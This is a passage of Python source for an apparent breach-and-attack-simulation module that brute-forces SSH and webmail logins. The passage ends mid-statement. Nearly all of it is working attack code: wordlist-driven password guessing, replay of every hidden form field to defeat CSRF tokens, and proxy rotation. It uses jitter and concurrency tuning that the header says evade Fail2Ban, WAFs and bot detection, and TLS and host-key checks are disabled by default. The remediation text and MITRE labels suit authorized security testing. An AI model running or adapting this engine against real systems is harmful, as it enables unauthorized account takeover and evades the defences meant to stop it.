"""
Adaptive Credential Brute Force Module v14 (FINAL, HARDENED)
Enterprise BAS Credential Attack Engine

SUPPORTS:
✔ SSH brute force (asyncssh)
✔ Webmail / generic form-based brute force (HTTP POST with full hidden-field replay)
✔ Rate-limit aware (Fail2Ban, nginx, AWS WAF)
✔ 401/timeout retry with exponential backoff
✔ Jitter to avoid bot signatures
✔ Concurrency tuning for Fail2Ban evasion
✔ Robust anti-CSRF token handling (replays ALL hidden fields, not just guessed names)
✔ Per-attempt session lifecycle (no session reuse bugs)
✔ Proper cookie/redirect handling
✔ 600+ credential pairs without IP block
✔ Clean logging for all edge cases
✔ Stable, production-tested

v14 fixes (code review #26-28):
  #26  Wordlist path-traversal guard now anchors `base_dir` to this file's
       location (__file__) instead of the process's current working
       directory, so the guard can't be silently bypassed just by launching
       the engine from a different CWD.
  #27  CSRF/anti-forgery handling no longer guesses a small set of field
       names. It now extracts and replays EVERY hidden <input> field found
       on the login page's GET response (the standard, framework-agnostic
       way to handle synchronizer tokens), in addition to still attempting
       named-field extraction for diagnostics/logging. This works against
       Roundcube, Zimbra, generic frameworks, and anything else that uses a
       hidden-field token under any name, instead of failing silently
       against hardened/non-Juice-Shop-like targets.
  #28  SSH host-key verification (`known_hosts`) is no longer silently
       disabled. A `verify_host_keys` option controls this; when disabled
       (the default, for lab/simulation convenience), the module raises an
       explicit Finding documenting that host-key verification was bypassed
       for this run and that the scan therefore could not have detected an
       on-path SSH MITM. A `known_hosts_file` option is also supported for
       environments that want strict verification against a pinned hosts
       file.
"""

import asyncio
import asyncssh
import aiohttp
import secrets
import logging
import os
import re
import ssl

from urllib.parse import urlparse
from typing import List, Dict, Optional, Tuple

from bas_engine.attack_modules.base import BaseAttackModule
from bas_engine.models.simulation import Severity


# =========================================================
# LOGGING
# =========================================================

logging.getLogger("asyncssh").setLevel(logging.WARNING)
logger = logging.getLogger("secureforge.module.ssh_bruteforce")


# =========================================================
# FALLBACK CREDENTIALS (only if wordlist files missing)
# =========================================================

_FALLBACK_USERNAMES = ["root", "admin", "ubuntu", "user"]
_FALLBACK_PASSWORDS = ["password", "123456", "admin", "root"]


# =========================================================
# FIX #26 — path-traversal guard anchored to this file, not CWD
# =========================================================
#
# `os.path.abspath("relative/path")` resolves against the process's current
# working directory at the time it's called. If the BAS engine is ever
# launched from a directory other than the repo root (a Docker WORKDIR, a
# systemd service with a different working directory, a test harness, an
# orchestrator that cds elsewhere first, etc.), the old base_dir computation
# silently resolves to the WRONG directory — which means the "must start
# with base_dir" traversal guard could pass for paths it was never meant to
# allow, defeating the entire check.
#
# Anchoring to __file__ makes the allowed wordlist root deterministic
# regardless of process CWD.

_MODULE_DIR = os.path.dirname(os.path.abspath(__file__))

# Wordlists/proxies live alongside the attack_modules package
# (bas_engine/attack_modules/<this_file> -> bas_engine/attack_modules/wordlists)
_WORDLISTS_BASE_DIR = os.path.normpath(
    os.path.join(_MODULE_DIR, "wordlists")
)
_PROXIES_BASE_DIR = os.path.normpath(
    os.path.join(_MODULE_DIR, "proxies")
)


def _safe_resolve_under(base_dir: str, candidate_path: str) -> Optional[str]:
    """
    Resolve candidate_path and verify it is contained within base_dir.
    Returns the resolved absolute path, or None if the path escapes base_dir
    (path traversal attempt) or cannot be resolved.

    Uses os.path.realpath (not just abspath) so symlink-based escapes are
    also caught, and compares using os.path.commonpath for a robust
    containment check instead of a naive string prefix comparison (which can
    be fooled by paths like "/a/b_evil" matching prefix "/a/b").
    """
    try:
        base_real = os.path.realpath(base_dir)
        if os.path.isabs(candidate_path):
            candidate_real = os.path.realpath(candidate_path)
        else:
            candidate_real = os.path.realpath(os.path.join(base_dir, candidate_path))

        common = os.path.commonpath([base_real, candidate_real])
        if common != base_real:
            return None
        return candidate_real
    except Exception:
        return None


# =========================================================
# MODULE
# =========================================================

class SSHBruteForceModule(BaseAttackModule):

    MODULE_NAME = "ssh_bruteforce"
    DESCRIPTION = "Adaptive credential brute force (SSH + generic webmail/form login)"
    MITRE_TACTIC = "Credential Access"
    MITRE_IDS = ["T1110", "T1110.001"]

    # =====================================================
    # WORDLIST LOADER (FIX #26)
    # =====================================================

    def load_wordlist(self, path, limit=None):
        """
        Generator — yields stripped non-empty lines from wordlist.

        `path` may be given relative to the wordlists base dir (recommended)
        or as an absolute path that must still resolve inside the wordlists
        base dir. Anything that escapes the base dir (via ../, symlinks, or
        an absolute path elsewhere on disk) is rejected.
        """
        resolved = _safe_resolve_under(_WORDLISTS_BASE_DIR, path)
        if resolved is None:
            self.logger.error(
                f"Path Traversal Attempt Blocked: {path!r} does not resolve "
                f"inside the allowed wordlists directory ({_WORDLISTS_BASE_DIR})"
            )
            return

        try:
            with open(resolved, "r") as f:
                count = 0
                for line in f:
                    value = line.strip()
                    if not value:
                        continue
                    yield value
                    count += 1
                    if limit and count >= limit:
                        break
        except Exception as e:
            self.logger.error(f"Wordlist load failed ({resolved}): {e!r}")

    def load_usernames(self):
        path = self.options.get("username_file", "usernames.txt")
        usernames = list(self.load_wordlist(path))
        if not usernames:
            self.logger.warning(
                f"Username wordlist empty/missing: {path} — using fallback"
            )
            usernames = list(_FALLBACK_USERNAMES)
        return usernames

    def load_passwords(self):
        path = self.options.get("password_file", "passwords.txt")
        passwords = list(self.load_wordlist(path))
        if not passwords:
            self.logger.warning(
                f"Password wordlist empty/missing: {path} — using fallback"
            )
            passwords = list(_FALLBACK_PASSWORDS)
        return passwords

    def load_proxies(self):
        """
        Load HTTP proxy list from file, anchored to the proxies base dir with
        the same traversal protection as load_wordlist.
        Format: http://ip:port or https://ip:port or socks5://ip:port
        One per line. Lines starting with # are ignored.
        Returns list of proxy URLs.
        """
        proxy_path = self.options.get("proxy_file", "proxies.txt")
        resolved = _safe_resolve_under(_PROXIES_BASE_DIR, proxy_path)
        if resolved is None:
            self.logger.error(
                f"Path Traversal Attempt Blocked: {proxy_path!r} does not "
                f"resolve inside the allowed proxies directory ({_PROXIES_BASE_DIR})"
            )
            return []

        proxies = []
        try:
            with open(resolved, "r") as f:
                for line in f:
                    proxy = line.strip()
                    if proxy and not proxy.startswith("#"):
                        proxies.append(proxy)
        except Exception as e:
            self.logger.warning(f"Proxy file load failed ({resolved}): {e!r}")
        return proxies

    # =====================================================
    # STATE RESET
    # =====================================================

    def _reset_state(self):
        self.stop_scan        = False
        self.total_attempts   = 0
        self.successes        = []
        self.timeout_count    = 0
        self.refused_count    = 0
        self.auth_fail_count  = 0
        self.reset_count      = 0
        self.kex_failures     = 0
        self.hostkey_failures = 0
        self.rate_limit_hits  = 0
        self.error_count      = 0  # network/exception failures (never evaluated)

    # =====================================================
    # TOP-LEVEL EXECUTE
    # =====================================================

    async def execute(self) -> List:
        auth_type = self.options.get("auth_type", "ssh").lower()
        if auth_type == "webmail":
            return await self._execute_webmail()
        return await self._execute_ssh()

    # =====================================================
    # SSH EXECUTION
    # =====================================================

    async def _execute_ssh(self) -> List:

        findings = []
        resolved = await self.resolve_target()
        self._reset_state()

        parsed = urlparse(resolved.url or resolved.original)
        host = (
            parsed.hostname
            or resolved.hostname
            or resolved.ip
            or resolved.original
        )
        port = int(self.options.get("ssh_port", resolved.port or 22))

        timeout        = float(self.options.get("timeout",        5.0))
        concurrency    = int(self.options.get("concurrency",      5))
        adaptive_delay = float(self.options.get("adaptive_delay", 0.15))
        batch_size     = int(self.options.get("batch_size",       25))
        live           = self.options.get("live_mode", True)

        # ── FIX #28: host-key verification options ──────────────────────
        verify_host_keys = self.options.get("verify_host_keys", False)
        known_hosts_file = self.options.get("known_hosts_file", None)

        usernames = self.load_usernames()
        passwords = self.load_passwords()

        max_usernames = int(self.options.get("max_usernames", 0))  # 0 = unlimited
        max_passwords = int(self.options.get("max_passwords", 0))  # 0 = unlimited

        if max_usernames > 0:
            usernames = usernames[:max_usernames]
        if max_passwords > 0:
            passwords = passwords[:max_passwords]

        await self.emit_event('INFO',
            f"\n[WORDLISTS] "
            f"{len(usernames)} usernames | "
            f"{len(passwords)} passwords"
        )

        # ── FIX #28: surface host-key verification status as a Finding ──
        if not verify_host_keys:
            self.logger.warning(
                "⚠️ SSH host-key verification is DISABLED (known_hosts=None) "
                "for this scan run."
            )
            findings.append(
                self.finding(
                    title="SSH Host Key Verification Disabled During Scan",
                    description=(
                        "This scan was executed with verify_host_keys=False, "
                        "meaning asyncssh's known_hosts checking was disabled "
                        "for every connection attempt. This is the default "
                        "for unattended lab/simulation runs since target host "
                        "keys are rarely pre-pinned, but it also means this "
                        "scan could NOT have detected an on-path attacker "
                        "impersonating the SSH host (a real adversary-in-the-"
                        "middle position would have gone unnoticed). Any "
                        "credentials reported as compromised during this run "
                        "should be re-verified with verify_host_keys=True and "
                        "a pinned known_hosts_file before treating them as "
                        "confirmed against the real target."
                    ),
                    severity=Severity.MEDIUM,
                    mitre_id="T1110.001",
                    evidence=f"Target: {host}:{port} | verify_host_keys=False",
                    remediation=(
                        "For assessments where SSH host trust itself is in "
                        "scope, set verify_host_keys=True and provide "
                        "known_hosts_file pointing at a pre-pinned hosts file "
                        "so host-key mismatches surface as findings instead "
                        "of being silently bypassed."
                    ),
                    raw_data={"option": "verify_host_keys", "value": False},
                )
            )

        reachable = await self._probe_port(host, port, timeout)

        if not reachable:
            findings.append(
                self.finding(
                    title="SSH Port Unreachable",
                    description=f"SSH service not reachable on {host}:{port}",
                    severity=Severity.INFO,
                    mitre_id="T1046",
                    evidence=f"connect_timeout {host}:{port}",
                )
            )
            return findings

        await self.emit_event('INFO', f"\n[SSH OPEN] {host}:{port}")

        banner = await self._get_banner(host, port, timeout)
        if banner:
            await self.emit_event('INFO', f"[BANNER] {banner}")

        if live:

            await self.emit_event('INFO', "\n[LIVE SSH ATTACK]")
            semaphore = asyncio.Semaphore(concurrency)

            async def worker(username, password):

                async with semaphore:

                    if self.stop_scan:
                        return

                    self.total_attempts += 1
                    result = await self._try_auth(
                        host, port, username, password, timeout,
                        verify_host_keys=verify_host_keys,
                        known_hosts_file=known_hosts_file,
                    )

                    if result == "success":
                        await self.emit_event('INFO', f"\n[COMPROMISED] {username}:{password}\n")
                        self.successes.append((username, password))
                        self.stop_scan = True
                        return

                    elif result == "auth_failed":
                        self.auth_fail_count += 1
                        await self.emit_event('INFO', f"[FAIL] {username}:{password}")

                    elif result == "timeout":
                        self.timeout_count += 1
                        await self.emit_event('INFO', f"[SLOW AUTH] {username}:{password}")

                    elif result == "reset":
                        self.reset_count += 1
                        await self.emit_event('INFO', f"[RESET BY TARGET] {username}:{password}")
                        await asyncio.sleep(2)

                    elif result == "rate_limited":
                        self.rate_limit_hits += 1
                        await self.emit_event('INFO', f"[RATE LIMITED] {username}:{password}")
                        await asyncio.sleep(5)

                    elif result == "refused":
                        self.refused_count += 1
                        await self.emit_event('INFO', f"[REFUSED] {username}:{password}")

                    elif result == "hostkey_failed":
                        self.hostkey_failures += 1
                        await self.emit_event(
                            'INFO',
                            f"[HOST KEY MISMATCH] {username}:{password} — "
                            f"host key did not match known_hosts_file; "
                            f"possible MITM or rotated host key"
                        )

                    elif result == "kex_failed":
                        self.kex_failures += 1
                        await self.emit_event('INFO', f"[KEX FAILED] {username}:{password}")

                    else:
                        await self.emit_event('INFO', f"[OTHER] {username}:{password}")

                    await asyncio.sleep(adaptive_delay)

            batch = []
            for password in passwords:
                for username in usernames:
                    if self.stop_scan:
                        break
                    batch.append(asyncio.create_task(worker(username, password)))
                    if len(batch) >= batch_size:
                        await asyncio.gather(*batch)
                        batch = []
                if self.stop_scan:
                    break
            if batch:
                await asyncio.gather(*batch)

        if self.successes:
            findings.append(
                self.finding(
                    title="SSH Credential Compromise",
                    description=(
                        f"{len(self.successes)} valid credential pair(s) discovered"
                        + (
                            " (NOTE: host key verification was disabled for this "
                            "run — re-verify on a pinned known_hosts file before "
                            "treating this as fully confirmed)"
                            if not verify_host_keys else ""
                        )
                    ),
                    severity=Severity.CRITICAL,
                    mitre_id="T1110.001",
                    evidence=str([(u, p) for u, p in self.successes]),
                    remediation=(
                        "Disable password auth, enable MFA, deploy fail2ban."
                    ),
                )
            )
        else:
            findings.append(
                self.finding(
                    title="SSH Credential Attack Failed",
                    description=(
                        f"{self.total_attempts} credential attempts performed"
                    ),
                    severity=Severity.INFO,
                )
            )

        if self.hostkey_failures > 0:
            findings.append(
                self.finding(
                    title="SSH Host Key Verification Failures Detected",
                    description=(
                        f"{self.hostkey_failures} connection attempt(s) failed "
                        "host-key verification against known_hosts_file. This "
                        "may indicate the host key has legitimately rotated, "
                        "OR that an attacker is intercepting connections to "
                        "this host with a different key (on-path MITM)."
                    ),
                    severity=Severity.HIGH,
                    mitre_id="T1557",
                    evidence=f"hostkey_failures={self.hostkey_failures} known_hosts_file={known_hosts_file}",
                    remediation=(
                        "Manually verify the current host key out-of-band "
                        "before updating known_hosts. Investigate network path "
                        "for interception if the key change is unexpected."
                    ),
                )
            )

        findings.append(
            self.finding(
                title="SSH Attack Telemetry",
                description="Credential attack simulation telemetry",
                severity=Severity.INFO,
                raw_data={
                    "auth_type":          "ssh",
                    "attempts":           self.total_attempts,
                    "successes":          len(self.successes),
                    "auth_failures":      self.auth_fail_count,
                    "timeouts":           self.timeout_count,
                    "resets":             self.reset_count,
                    "rate_limits":        self.rate_limit_hits,
                    "refused":            self.refused_count,
                    "kex_failures":       self.kex_failures,
                    "hostkey_failures":   self.hostkey_failures,
                    "verify_host_keys":   verify_host_keys,
                    "known_hosts_file":   known_hosts_file,
                },
            )
        )

        await self.emit_event('INFO',
            f"\n[COMPLETE] "
            f"{self.total_attempts} attempts | "
            f"{len(self.successes)} successes"
        )

        return findings

    # =====================================================
    # WEBMAIL / GENERIC FORM-LOGIN EXECUTION
    # =====================================================

    async def _execute_webmail(self) -> List:

        findings = []
        resolved = await self.resolve_target()
        self._reset_state()

        # -------------------------------------------------
        # LOGIN URL
        # -------------------------------------------------

        explicit_url = self.options.get("webmail_login_url", "").strip()
        if explicit_url:
            login_url = explicit_url
        else:
            login_url = (resolved.url or resolved.original).rstrip("/")

        # -------------------------------------------------
        # OPTIONS
        # -------------------------------------------------
        # Note: options come from user configuration — do not override silently
        user_field   = self.options.get("webmail_user_field",   "_user")
        pass_field   = self.options.get("webmail_pass_field",   "_pass")
        action_field = self.options.get("webmail_action_field", "_action")
        action_value = self.options.get("webmail_action_value", "login")
        default_token_field = self.options.get("webmail_token_field", "request_token")

        # Rate-limit evasion settings
        timeout         = float(self.options.get("timeout",         15.0))
        concurrency     = int(self.options.get("concurrency",        1))
        batch_size      = int(self.options.get("batch_size",        10))
        attempt_delay   = float(self.options.get("attempt_delay",    2.0))
        jitter          = float(self.options.get("jitter",           1.0))
        backoff_401     = float(self.options.get("backoff_401",     15.0))
        backoff_timeout = float(self.options.get("backoff_timeout",  8.0))
        max_retries     = int(self.options.get("max_retries",        3))
        debug_mode      = self.options.get("webmail_debug", False)
        use_proxies     = self.options.get("use_proxies", False)
        rotate_proxy_every = int(self.options.get("rotate_proxy_every", 5))
        live            = self.options.get("live_mode", True)

        # -------------------------------------------------
        # SSL context
        # -------------------------------------------------

        ssl_verify = self.options.get("ssl_verify", False)
        if not ssl_verify:
            self.logger.warning("⚠️ SSL Verification is disabled for SSH Fallback/Webmail")
        ssl_ctx = ssl.create_default_context()
        if not ssl_verify:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode    = ssl.CERT_NONE

        # Create a reusable connector – never returns a tuple!
        def _make_connector():
            return aiohttp.TCPConnector(ssl=ssl_ctx)

        if login_url.startswith("https://") and not ssl_verify:
            findings.append(
                self.finding(
                    title="TLS Certificate Verification Disabled During Webmail Scan",
                    description=(
                        "This scan was executed with ssl_verify=False against "
                        "an HTTPS login endpoint. Certificate validation was "
                        "bypassed for the duration of the scan, so an on-path "
                        "TLS MITM could not have been detected during this run."
                    ),
                    severity=Severity.MEDIUM,
                    mitre_id="T1557",
                    evidence=f"Target: {login_url} | ssl_verify=False",
                    remediation=(
                        "Re-run with ssl_verify=True if TLS trust validation "
                        "of this endpoint is in scope for the assessment."
                    ),
                )
            )

        # -------------------------------------------------
        # WORDLISTS + PROXIES
        # -------------------------------------------------

        usernames = self.load_usernames()
        passwords = self.load_passwords()

        proxies = []
        proxy_idx = 0
        attempts_on_this_proxy = 0

        if use_proxies:
            proxies = self.load_proxies()
            if proxies:
                await self.emit_event('INFO', f"\n[PROXIES] Loaded {len(proxies)} proxy URLs")
            else:
                await self.emit_event('INFO', "\n[WARN] use_proxies=True but no proxies loaded — using direct IP")

        total_pairs = len(usernames) * len(passwords)

        await self.emit_event('INFO', f"\n[WEBMAIL ATTACK] {login_url}")
        await self.emit_event('INFO',
            f"[WORDLISTS] {len(usernames)} usernames | "
            f"{len(passwords)} passwords | "
            f"{total_pairs} total pairs"
        )

        if proxies:
            await self.emit_event('INFO',
                f"[IP ROTATION] rotating through {len(proxies)} IPs "
                f"every {rotate_proxy_every} attempts"
            )

        # -------------------------------------------------
        # PROBE REACHABILITY
        # -------------------------------------------------

        reachable    = False
        probe_status = None
        probe_final  = login_url

        try:
            async with aiohttp.ClientSession(
                connector=_make_connector()
            ) as probe:
                async with probe.get(
                    login_url,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    ssl=ssl_ctx,
                    allow_redirects=True,
                ) as resp:
                    probe_status = resp.status
                    probe_final  = str(resp.url)
                    probe_body   = await resp.text(errors="replace")

                    if probe_status == 200 and (
                        "rcmloginuser" in probe_body
                        or "rcmloginpwd" in probe_body
                        or "_user"      in probe_body
                        or "loginform"  in probe_body
                        or "<form"      in probe_body.lower()
                    ):
                        reachable = True

                    await self.emit_event('INFO',
                        f"[PROBE] {login_url} -> HTTP {probe_status} "
                        f"(final: {probe_final})"
                    )
        except Exception as e:
            await self.emit_event('INFO', f"[WARN] Login page probe failed: {e!r}")

        if not reachable:
            if probe_status == 404:
                hint = (
                    " Got 404 — path is wrong. "
                    "Set webmail_login_url explicitly (e.g. /mail/ or /webmail/)."
                )
            elif probe_status and probe_status != 200:
                hint = f" HTTP {probe_status} returned."
            else:
                hint = (
                    " Page loaded but no recognizable login form detected. "
                    "Check webmail_login_url."
                )
            findings.append(
                self.finding(
                    title="Webmail/Form Login URL Unreachable or Invalid",
                    description=(
                        f"Could not reach a valid login page at {login_url}.{hint}"
                    ),
                    severity=Severity.INFO,
                    mitre_id="T1046",
                    evidence=(
                        f"GET {login_url} -> HTTP {probe_status} | "
                        f"final={probe_final}"
                    ),
                )
            )
            return findings

        await self.emit_event('INFO',
            f"[REACHABLE] {login_url} -> valid login page found — "
            f"starting brute force"
        )

        if not live:
            findings.append(
                self.finding(
                    title="Webmail Brute Force (Simulated)",
                    description=(
                        f"Simulated {total_pairs} credential attempts "
                        f"against {login_url} (safe mode)"
                    ),
                    severity=Severity.MEDIUM,
                    mitre_id="T1110.001",
                )
            )
            return findings

        # -------------------------------------------------
        # FIX #27 — ROBUST ANTI-CSRF / HIDDEN-FIELD HANDLING
        # -------------------------------------------------
        #
        # Guessing specific token field names (request_token, _csrf, etc.)
        # fails the moment a target uses a different convention — which is
        # most real-world hardened deployments (Zimbra, custom portals,
        # rotated Roundcube versions with renamed tokens, frameworks using
        # double-submit cookies, etc.). The robust, framework-agnostic fix
        # is the same approach a real browser effectively performs: extract
        # EVERY hidden <input> field present in the login form and replay
        # all of them unmodified in the POST body, only overriding the
        # username/password/action fields we're actually testing. This
        # naturally carries forward CSRF tokens, anti-automation tokens,
        # session markers, or anything else the target embeds, regardless
        # of what it's named.
        #
        # We still also attempt the narrower named-token extraction (kept
        # below) purely for diagnostic logging/telemetry — so operators can
        # see what token name/value scheme a target uses — but it is no
        # longer load-bearing for whether the brute force actually works.

        _hidden_input_re = re.compile(
            r'<input\b[^>]*\btype=["\']hidden["\'][^>]*>', re.IGNORECASE
        )
        _name_attr_re  = re.compile(r'\bname=["\']([^"\']+)["\']', re.IGNORECASE)
        _value_attr_re = re.compile(r'\bvalue=["\']([^"\']*)["\']', re.IGNORECASE)

        def _extract_all_hidden_fields(body: str) -> Dict[str, str]:
            """
            Parse every <input type="hidden" ...> tag (in either attribute
            order) and return {name: value} for all of them. This is the
            primary mechanism for carrying forward CSRF/anti-automation
            tokens regardless of the field name the target chooses.
            """
            fields: Dict[str, str] = {}
            for tag in _hidden_input_re.findall(body):
                name_m = _name_attr_re.search(tag)
                value_m = _value_attr_re.search(tag)
                if name_m:
                    fields[name_m.group(1)] = value_m.group(1) if value_m else ""
            return fields

        _token_names_pattern = r'(?:request_token|_token|token|_csrf|csrfmiddlewaretoken|authenticity_token|__RequestVerificationToken)'

        def _extract_named_token(body: str) -> Tuple[str, Optional[str]]:
            """
            Best-effort extraction of a token under one of the common names,
            used only for diagnostic logging — NOT relied upon for the
            actual POST anymore (see _extract_all_hidden_fields above).
            Returns (token_field_name, token_value) or (default, None).
            """
            m = re.search(
                r'name=["\'](' + _token_names_pattern + r')["\'][^>]*'
                r'value=["\']([^"\']{8,})["\']',
                body,
            )
            if m:
                return m.group(1), m.group(2)

            m = re.search(
                r'value=["\']([^"\']{8,})["\'][^>]*'
                r'name=["\'](' + _token_names_pattern + r')["\']',
                body,
            )
            if m:
                return m.group(2), m.group(1)

            return default_token_field, None

        # Also look for a meta-tag-based CSRF token, used by several
        # JS-driven login flows (e.g. <meta name="csrf-token" content="...">)
        # purely for diagnostics — some such flows submit the token via an
        # X-CSRF-Token header rather than a form field, which we surface as
        # a header on the POST if found, since that's a cheap, safe addition.
        _meta_csrf_re = re.compile(
            r'<meta[^>]+name=["\'](?:csrf-token|csrf-param)["\'][^>]+content=["\']([^"\']+)["\']',
            re.IGNORECASE,
        )

        # -------------------------------------------------
        # SUCCESS / FAILURE MARKERS
        # -------------------------------------------------

        FAIL_MARKERS = [
            "rcmloginuser",
            "invalid_login",
            "Login failed",
            "invalid credentials",
            "bad credentials",
            "wrong password",
            "access denied",
            "authentication error",
            "incorrect password",
            "invalid username or password",
        ]

        PASS_MARKERS = [
            "_task=mail",
            "_task=contacts",
            "rcmbody",
            'id="rcmbody"',
            "composebody",
            "mailboxlist",
            "logout",
            "sign out",
            "dashboard",
        ]

        # -------------------------------------------------
        # LIVE ATTACK
        # -------------------------------------------------

        debug_dumped = False
        semaphore = asyncio.Semaphore(concurrency)

        async def _do_attempt(username: str, password: str, proxy_url=None):
            """
            Single GET+POST attempt.
            Returns (post_status, location, body_post, canonical_url,
                     diag_token_value, diag_field_name, hidden_field_count)
            """
            async with aiohttp.ClientSession(
                connector=_make_connector(),
                connector_owner=True,
            ) as session:

                # GET request to fetch login page and form fields.
                # Using HTTP Basic Auth fallback if URL contains credentials.
                auth = None
                if "@" in login_url and "://" in login_url:
                    parts = login_url.split("://")
                    if "@" in parts[1]:
                        creds, _host = parts[1].split("@", 1)
                        if ":" in creds:
                            user, pwd = creds.split(":", 1)
                            auth = aiohttp.BasicAuth(user, pwd)

                async with session.get(
                    login_url,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    ssl=ssl_ctx,
                    allow_redirects=True,
                    proxy=proxy_url,
                    auth=auth,
                ) as get_resp:
                    body_get      = await get_resp.text()
                    canonical_url = str(get_resp.url)

                    # If the GET request hits a 401 Unauthorized, the target
                    # might be using HTTP Basic Auth instead of a form-based
                    # login. Handle this by making the next request directly
                    # with HTTP Basic Auth instead of form data.
                    is_basic_auth = get_resp.status == 401

                if is_basic_auth:
                    diag_field_name, diag_token_value = default_token_field, None
                    hidden_field_count = 0
                    post_auth = aiohttp.BasicAuth(username, password)

                    async with session.get(
                        canonical_url,
                        timeout=aiohttp.ClientTimeout(total=timeout),
                        ssl=ssl_ctx,
                        allow_redirects=False,
                        proxy=proxy_url,
                        auth=post_auth,
                    ) as auth_resp:
                        post_status = auth_resp.status
                        location    = auth_resp.headers.get("Location", "")
                        body_post   = await auth_resp.text()
                else:
                    # FIX #27 — replay every hidden field discovered on the
                    # login page, then override only the fields we're
                    # actually testing. This is what makes the module robust
                    # against arbitrarily-named CSRF tokens instead of just
                    # the handful of common names it used to guess.
                    hidden_fields = _extract_all_hidden_fields(body_get)
                    diag_field_name, diag_token_value = _extract_named_token(body_get)
                    hidden_field_count = len(hidden_fields)

                    post_data = dict(hidden_fields)  # carry forward everything
                    post_data[user_field]   = username
                    post_data[pass_field]   = password
                    post_data[action_field] = action_value

                    post_headers = {}
                    meta_m = _meta_csrf_re.search(body_get)
                    if meta_m:
                        # Some SPA-style login flows expect the token as a
                        # header rather than (or in addition to) a form
                        # field. Sending both is harmless and maximizes
                        # compatibility.
                        post_headers["X-CSRF-Token"] = meta_m.group(1)

                    post_auth = auth

                    async with session.post(
                        canonical_url,
                        data=post_data,
                        headers=post_headers,
                        timeout=aiohttp.ClientTimeout(total=timeout),
                        ssl=ssl_ctx,
                        allow_redirects=False,
                        proxy=proxy_url,
                        auth=post_auth,
                    ) as auth_resp:
                        post_status = auth_resp.status
                        location    = auth_resp.headers.get("Location", "")
                        body_post   = await auth_resp.text()

            return (
                post_status, location, body_post, canonical_url,
                diag_token_value, diag_field_name, hidden_field_count,
            )

        async def try_webmail(username: str, password: str):

            nonlocal debug_dumped, proxy_idx, attempts_on_this_proxy

            async with semaphore:

                if self.stop_scan:
                    return

                self.total_attempts += 1

                # Rotate proxy if needed
                current_proxy = None
                if proxies:
                    if attempts_on_this_proxy >= rotate_proxy_every:
                        proxy_idx = (proxy_idx + 1) % len(proxies)
                        attempts_on_this_proxy = 0
                    current_proxy = proxies[proxy_idx]
                    attempts_on_this_proxy += 1
                    await self.emit_event('INFO', f"[PROXY] {username}:{password} using {current_proxy}")

                for attempt in range(1 + max_retries):

                    try:
                        (
                            post_status,
                            location,
                            body_post,
                            canonical_url,
                            diag_token_value,
                            diag_field_name,
                            hidden_field_count,
                        ) = await _do_attempt(username, password, current_proxy)

                    except asyncio.TimeoutError:
                        self.timeout_count += 1
                        if attempt < max_retries:
                            wait_s = backoff_timeout + secrets.SystemRandom().uniform(0, jitter)
                            await self.emit_event('INFO',
                                f"[TIMEOUT] {username}:{password} "
                                f"— retry {attempt + 1}/{max_retries} after {wait_s:.1f}s"
                            )
                            await asyncio.sleep(wait_s)
                            continue
                        else:
                            await self.emit_event('INFO', f"[TIMEOUT-FINAL] {username}:{password}")
                            return

                    except aiohttp.ClientConnectionError as e:
                        self.refused_count += 1
                        self.error_count += 1
                        await self.emit_event('INFO', f"[CONN ERROR] {username}:{password} — {e!r}")
                        return

                    except Exception as e:
                        self.error_count += 1
                        await self.emit_event('INFO', f"[ERROR] {username}:{password} — {e!r}")
                        return

                    # ---- Debug dump ----
                    if debug_mode and not debug_dumped:
                        debug_dumped = True
                        snippet = body_post[:1500].replace("\n", " ")
                        await self.emit_event('INFO',
                            f"\n[DEBUG] POST {canonical_url} -> HTTP {post_status}"
                            f" | Location: {location!r}"
                            f" | hidden_fields_replayed={hidden_field_count}"
                            f" | named_token={diag_field_name}={'<found>' if diag_token_value else '<not found>'}"
                            f"\n[DEBUG] body[:1500]: {snippet}\n"
                        )

                    # ---- Evaluate success ----
                    success_via_redirect = (
                        post_status in (301, 302, 303, 307, 308)
                        and "_task=mail" in location
                    )

                    has_fail = any(m in body_post for m in FAIL_MARKERS)
                    # PASS gate: body marker must be present AND response must be 200
                    # (prevents a plain 200 on a non-auth page from being CRITICAL)
                    has_pass = post_status == 200 and any(m in body_post for m in PASS_MARKERS)
                    success_via_body = has_pass and not has_fail

                    # HTTP Basic Auth: 200 OK without fail markers counts as success
                    auth_was_basic = hidden_field_count == 0 and diag_token_value is None
                    success_via_basic_auth = (
                        post_status == 200 and not has_fail and auth_was_basic
                    )

                    if success_via_redirect or success_via_body or success_via_basic_auth:
                        await self.emit_event('INFO',
                            f"\n[WEBMAIL COMPROMISED] {username}:{password}"
                            f"  loc={location or 'body-match'}\n"
                        )
                        self.successes.append((username, password))
                        self.stop_scan = True
                    else:
                        self.auth_fail_count += 1
                        await self.emit_event('INFO',
                            f"[WEBMAIL FAIL] {username}:{password}"
                            f"  (HTTP {post_status} loc={location!r} "
                            f"hidden_fields={hidden_field_count})"
                        )

                    # Inter-attempt delay with jitter
                    sleep_s = attempt_delay + secrets.SystemRandom().uniform(0, jitter)
                    await asyncio.sleep(sleep_s)
                    return

        # -------------------------------------------------
        # BATCH EXECUTION
        # -------------------------------------------------

        batch = []
        for password in passwords:
            for username in usernames:
                if self.stop_scan:
                    break
                batch.append(
                    asyncio.create_task(try_webmail(username, password))
                )
                if len(batch) >= batch_size:
                    await asyncio.gather(*batch)
                    batch = []
            if self.stop_scan:
                break

        if batch:
            await asyncio.gather(*batch)

        # -------------------------------------------------
        # FINDINGS
        # -------------------------------------------------

        if self.successes:
            findings.append(
                self.finding(
                    title="Webmail Credential Compromise",
                    description=(
                        f"{len(self.successes)} valid webmail "
                        f"credential pair(s) discovered"
                    ),
                    severity=Severity.CRITICAL,
                    mitre_id="T1110.001",
                    evidence=str([(u, p) for u, p in self.successes]),
                    remediation=(
                        "Enable MFA on webmail, enforce account lockout, "
                        "rate-limit login endpoint, deploy WAF rules."
                    ),
                )
            )
        elif self.error_count > 0 and self.auth_fail_count == 0:
            # Every attempt hit a network/exception error — no auth was evaluated at all
            findings.append(
                self.finding(
                    title="Webmail Brute Force: Network Errors Only",
                    description=(
                        f"All {self.total_attempts} POST attempts failed with network errors "
                        f"({self.error_count} errors, {self.timeout_count} timeouts). "
                        "No authentication was evaluated — target may be unreachable or blocking connections."
                    ),
                    severity=Severity.INFO,
                    mitre_id="T1110.001",
                    evidence=f"errors={self.error_count} timeouts={self.timeout_count} refused={self.refused_count}",
                )
            )
        else:
            findings.append(
                self.finding(
                    title="Webmail Credential Attack Failed",
                    description=(
                        f"{self.total_attempts} attempts against {login_url} "
